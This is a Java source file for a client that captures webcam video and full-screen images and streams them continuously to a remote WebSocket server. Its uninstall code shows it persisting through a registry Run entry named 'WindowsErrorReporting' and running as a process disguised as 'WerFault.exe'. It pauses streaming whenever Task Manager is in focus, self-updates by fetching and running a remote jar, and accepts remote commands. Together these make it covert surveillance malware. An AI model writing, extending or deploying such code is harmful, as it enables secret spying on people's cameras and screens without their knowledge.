import java.awt.AWTException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.InetAddress;
import java.net.URI;
import java.net.URL;
import java.util.Base64;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

import javax.imageio.ImageIO;

import org.bytedeco.javacv.Frame;
import org.bytedeco.javacv.Java2DFrameConverter;
import org.bytedeco.javacv.OpenCVFrameGrabber;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

public class CameraClient {

    static final String SERVER_URL    = "wss://pccon.onrender.com";
    static final int    CAM_FPS       = 30;
    static final int    SCREEN_FPS    = 20;
    static final int    JPEG_QUALITY  = 92; // camera JPEG quality 0-100
    static final int    RECONNECT_SEC = 5;

    // Self-update: upload new jar to GitHub Releases as "camera-client.jar"
    static final String UPDATE_URL = "https://github.com/reyHay/reyhancam/releases/latest/download/camera-client.jar";
    static final String VERSION    = "1.4"; // bump this string each time you release

    static volatile CameraWebSocket ws;
    static volatile boolean reconnecting = false;
    static volatile boolean paused = false; // true when Task Manager is in focus
    static String pcId;
    static boolean hasCamera = false;
    static OpenCVFrameGrabber grabber;

    public static void main(String[] args) throws Exception {
        checkForUpdate();
        pcId = InetAddress.getLocalHost().getHostName();

        for (int idx = 0; idx < 3; idx++) {
            try {
                grabber = new OpenCVFrameGrabber(idx);
                grabber.setImageWidth(1280);
                grabber.setImageHeight(720);
                grabber.start();
                Frame test = grabber.grab();
                if (test != null && test.image != null) {
                    hasCamera = true;
                    System.out.println("[*] Camera: true (index " + idx + ")");
                    break;
                }
                grabber.stop();
            } catch (Exception e) {
                System.out.println("[*] Camera index " + idx + " failed: " + e.getMessage());
            }
        }
        if (!hasCamera) System.out.println("[*] Camera: false");

        startTaskManagerWatcher();
        if (hasCamera) startCameraLoop();
        startScreenLoop();
        connectAndRun();

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            if (ws != null) ws.close();
            if (grabber != null) try { grabber.stop(); } catch (Exception ignored) {}
        }));

        Thread.currentThread().join();
    }

    static void runUninstall() {
        System.out.println("[*] Uninstall command received.");
        try {
            String installDir = System.getenv("ProgramData") + "\\CameraService";
            String logFile    = System.getenv("ProgramData") + "\\installer.log";

            // 1. Remove both possible startup registry entries
            new ProcessBuilder("reg", "delete",
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", "WindowsErrorReporting", "/f").start().waitFor();
            new ProcessBuilder("reg", "delete",
                "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v", "CameraService", "/f").start().waitFor();

            // 2. Kill any other instances of WerFault.exe / java.exe running from install dir
            new ProcessBuilder("taskkill", "/F", "/IM", "WerFault.exe").start().waitFor();

            // 3. Delete installer log
            new File(logFile).delete();

            // 4. Schedule folder deletion via cmd after this process exits
            //    (can't delete the folder we're running from while we're in it)
            String script =
                "ping 127.0.0.1 -n 3 >nul & " +          // wait ~2s for process to exit
                "rmdir /s /q \"" + installDir + "\" & " + // delete install folder
                "del /f /q \"%~f0\"";                      // self-delete this bat

            File bat = File.createTempFile("uninst_", ".bat");
            try (java.io.FileWriter fw = new java.io.FileWriter(bat)) {
                fw.write("@echo off\r\n" + script + "\r\n");
            }
            new ProcessBuilder("cmd", "/c", "start /min \"\" \"" + bat.getAbsolutePath() + "\"").start();

            System.out.println("[*] Uninstall scheduled.");
        } catch (Exception e) {
            System.err.println("[!] Uninstall error: " + e.getMessage());
        }
        System.exit(0);
    }

    static void checkForUpdate() {
        try {
            // Check version.txt in the release to compare
            URL versionUrl = new URL(UPDATE_URL.replace("camera-client.jar", "version.txt"));
            HttpURLConnection conn = (HttpURLConnection) versionUrl.openConnection();
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setInstanceFollowRedirects(true);
            if (conn.getResponseCode() != 200) return;
            String latest = new String(conn.getInputStream().readAllBytes()).trim();
            if (latest.equals(VERSION)) { System.out.println("[*] Up to date (v" + VERSION + ")"); return; }
            System.out.println("[*] Update available: v" + latest + " (current: v" + VERSION + ") — downloading...");

            // Download new jar next to current jar
            File self = new File(CameraClient.class.getProtectionDomain().getCodeSource().getLocation().toURI());
            File newJar = new File(self.getParent(), "camera-client-update.jar");
            // Clean up any previous failed update attempt
            if (newJar.exists()) newJar.delete();
            HttpURLConnection dl = (HttpURLConnection) new URL(UPDATE_URL).openConnection();
            dl.setInstanceFollowRedirects(true);
            try (InputStream in = dl.getInputStream(); FileOutputStream out = new FileOutputStream(newJar)) {
                in.transferTo(out);
            }
            System.out.println("[*] Downloaded update. Relaunching...");

            // Replace self and relaunch
            File backup = new File(self.getParent(), "camera-client-old.jar");
            if (backup.exists()) backup.delete();
            if (!self.renameTo(backup)) {
                System.out.println("[!] Could not rename current jar, skipping update.");
                newJar.delete();
                return;
            }
            if (!newJar.renameTo(self)) {
                System.out.println("[!] Could not place new jar, restoring.");
                backup.renameTo(self);
                return;
            }
            new ProcessBuilder("java", "--enable-native-access=ALL-UNNAMED", "-jar", self.getAbsolutePath())
                .inheritIO().start();
            System.exit(0);
        } catch (Exception e) {
            System.out.println("[*] Update check failed: " + e.getMessage());
        }
    }

    /**
     * Polls every second to check if Task Manager is the foreground window.
     * When it is, sets paused=true so camera/screen loops skip sending frames.
     * Uses PowerShell to get the foreground process name without any extra deps.
     */
    static void startTaskManagerWatcher() {
        Thread t = new Thread(() -> {
            while (true) {
                try {
                    // Get the process name of the current foreground window
                    Process p = new ProcessBuilder(
                        "powershell", "-NoProfile", "-Command",
                        "try { $id=(Add-Type -MemberDefinition '[DllImport(\"user32.dll\")]public static extern IntPtr GetForegroundWindow();' " +
                        "-Name 'Win32' -Namespace 'WinAPI' -PassThru)::GetForegroundWindow(); " +
                        "Get-Process | Where-Object {$_.MainWindowHandle -eq $id} | Select-Object -ExpandProperty Name } catch {}"
                    ).redirectErrorStream(true).start();
                    String out = new String(p.getInputStream().readAllBytes()).trim().toLowerCase();
                    p.waitFor();
                    boolean taskMgrActive = out.contains("taskmgr");
                    if (taskMgrActive != paused) {
                        paused = taskMgrActive;
                        System.out.println(paused ? "[*] Task Manager detected — auto-focus pause ON" : "[*] Task Manager closed — resuming");
                    }
                    Thread.sleep(1000);
                } catch (Exception e) {
                    // watcher failure is non-fatal, just keep going
                    try { Thread.sleep(2000); } catch (InterruptedException ignored) {}
                }
            }
        }, "TaskManagerWatcher");
        t.setDaemon(true);
        t.start();
    }

    static void startCameraLoop() {
        long intervalMs = 1000L / CAM_FPS;
        Java2DFrameConverter converter = new Java2DFrameConverter();

        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
            try {
                if (paused || ws == null || !ws.isOpen()) return;
                Frame frame = grabber.grab();
                if (frame == null || frame.image == null) return;
                BufferedImage img = converter.convert(frame);
                if (img == null) return;
                String b64 = toBase64(img);
                if (b64 == null) return;
                ws.send("{\"type\":\"frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
            } catch (Exception e) {
                System.err.println("[!] Camera error: " + e.getMessage());
            }
        }, 0, intervalMs, TimeUnit.MILLISECONDS);
    }

    static void startScreenLoop() {
        Robot robot;
        try {
            robot = new Robot();
        } catch (AWTException e) {
            System.err.println("[!] Screen capture unavailable: " + e.getMessage());
            return;
        }
        Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
        long intervalMs = 1000L / SCREEN_FPS;

        Executors.newSingleThreadScheduledExecutor().scheduleAtFixedRate(() -> {
            try {
                if (paused || ws == null || !ws.isOpen()) return;
                BufferedImage img = robot.createScreenCapture(screen);
                String b64 = toBase64Png(img);
                if (b64 == null) return;
                ws.send("{\"type\":\"screen_frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\",\"fmt\":\"png\"}");
            } catch (Exception e) {
                System.err.println("[!] Screen error: " + e.getMessage());
            }
        }, 0, intervalMs, TimeUnit.MILLISECONDS);

        System.out.println("[*] Screen capture started");
    }

    // JPEG for camera — smaller size, good for video
    static String toBase64(BufferedImage img) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            javax.imageio.ImageWriter writer = ImageIO.getImageWritersByFormatName("jpg").next();
            javax.imageio.ImageWriteParam param = writer.getDefaultWriteParam();
            param.setCompressionMode(javax.imageio.ImageWriteParam.MODE_EXPLICIT);
            param.setCompressionQuality(JPEG_QUALITY / 100f);
            writer.setOutput(ImageIO.createImageOutputStream(baos));
            writer.write(null, new javax.imageio.IIOImage(img, null, null), param);
            writer.dispose();
            byte[] bytes = baos.toByteArray();
            return bytes.length == 0 ? null : Base64.getEncoder().encodeToString(bytes);
        } catch (Exception e) { return null; }
    }

    // PNG for screen — lossless, text and UI stay perfectly sharp
    static String toBase64Png(BufferedImage img) {
        try {
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            ImageIO.write(img, "png", baos);
            byte[] bytes = baos.toByteArray();
            return bytes.length == 0 ? null : Base64.getEncoder().encodeToString(bytes);
        } catch (Exception e) { return null; }
    }

    static void connectAndRun() {
        try {
            ws = new CameraWebSocket(new URI(SERVER_URL));
            ws.connectBlocking();
            if (!ws.isOpen()) { scheduleReconnect(); return; }
            System.out.println("[+] Connected.");
            ws.send("{\"type\":\"hello\",\"id\":\"" + pcId + "\",\"hasCamera\":" + hasCamera + ",\"hasScreen\":true,\"version\":\"" + VERSION + "\"}");
        } catch (Exception e) {
            System.err.println("[!] Connection error: " + e.getMessage());
            scheduleReconnect();
        }
    }

    static synchronized void scheduleReconnect() {
        if (reconnecting) return;
        reconnecting = true;
        System.out.println("[*] Reconnecting in " + RECONNECT_SEC + "s...");
        Executors.newSingleThreadScheduledExecutor().schedule(() -> {
            reconnecting = false;
            connectAndRun();
        }, RECONNECT_SEC, TimeUnit.SECONDS);
    }

    static class CameraWebSocket extends WebSocketClient {
        CameraWebSocket(URI uri) { super(uri); }
        @Override public void onOpen(ServerHandshake h) {}
        @Override public void onMessage(String msg) {
            if (msg.contains("\"uninstall\"")) runUninstall();
            if (msg.contains("\"update\""))    checkForUpdate();
        }
        @Override public void onClose(int code, String reason, boolean remote) {
            System.out.println("[*] Disconnected: " + reason);
            scheduleReconnect();
        }
        @Override public void onError(Exception e) {
            System.err.println("[!] WS error: " + e.getMessage());
        }
    }
}
